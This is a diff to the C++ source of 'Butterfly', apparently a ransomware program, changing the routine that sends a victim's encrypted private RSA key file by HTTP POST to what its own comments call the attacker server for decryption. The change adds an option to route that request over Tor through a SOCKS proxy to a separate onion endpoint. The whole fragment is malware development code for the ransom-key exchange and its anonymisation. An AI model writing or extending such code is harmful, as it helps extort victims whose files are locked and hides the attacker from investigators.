@@ -126,7 +126,8 @@ void Butterfly::run()
         loadEncryptedFiles(cprivateRSAFileHex, rsaFileHex);
 
         // HTTPClient to send post request to decrypt the CPrivateRSA.bin file
-        std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient());
+        std::shared_ptr<TCPSocket> tcpSocket = std::make_shared<TCPSocket>();
+        std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient(tcpSocket));
 
         // Create the correct formParam string with mandatory param:value pairs
         _formParamVec.insert(_formParamVec.end(), {std::make_pair(butterfly::params::ENC_CPRIVATERSA_FILENAME, cprivateRSAFileHex),
@@ -172,7 +173,7 @@ void Butterfly::run()
         server->stop();
     }
     // Start only Decryption with the remote decrypted file
-    else if ( !_args.decrypt.empty() && _args.serverpKey.empty())
+    else if ( !_args.decrypt.empty() && _args.serverpKey.empty() )
     {
         std::cout << "Start Decryption from directory " << _args.decrypt << std::endl;
 
@@ -183,8 +184,16 @@ void Butterfly::run()
         // Connection check whether internet is available for the POST request to the attacker server or not
         checkInternetConnection();
 
-        // HTTPClient to send post request to decrypt the CPrivateRSA.bin file
-        std::unique_ptr<butterfly::HTTPClient> httpClient(new butterfly::HTTPClient());
+        std::unique_ptr<butterfly::HTTPClient> httpClient;
+        if (_args.tor)
+        {
+            std::shared_ptr<TORSocket> torSocket = std::make_shared<TORSocket>(butterfly::params::TOR_CLIENT_SOCKS_IP, butterfly::params::TOR_CLIENT_SOCKS_PORT);
+            httpClient = std::unique_ptr<butterfly::HTTPClient>(new butterfly::HTTPClient(torSocket));
+        } else
+        {
+            std::shared_ptr<TCPSocket> tcpSocket = std::make_shared<TCPSocket>();
+            httpClient = std::unique_ptr<butterfly::HTTPClient>(new butterfly::HTTPClient(tcpSocket));
+        }
 
         // Create the correct formParam string with mandatory param:value pairs
         _formParamVec.insert(_formParamVec.end(), {std::make_pair(butterfly::params::ENC_CPRIVATERSA_FILENAME, cprivateRSAFileHex),
@@ -192,8 +201,15 @@ void Butterfly::run()
                                                              std::make_pair("RSAKeySize", std::to_string(butterfly::params::RSA_KEYSIZE))});
         std::string formParamStr = butterfly::createFormParamStr(_formParamVec);
 
+        std::string decryptedCPrivateRSAStr;
         // Send the http post request to the REMOTE_DECRYPTION_URL
-        std::string decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_ENDPOINT_URL, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT);
+        if (_args.tor)
+        {
+            decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_ENDPOINT_URL_TOR, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT_TOR);
+        } else
+        {
+            decryptedCPrivateRSAStr = httpClient->post(butterfly::params::REMOTE_DECRYPTION_ENDPOINT_URL, formParamStr, butterfly::params::REMOTE_DECRYPTION_URL_PORT);
+        }
 
         if ( httpClient->statusCode == 200 )
         {
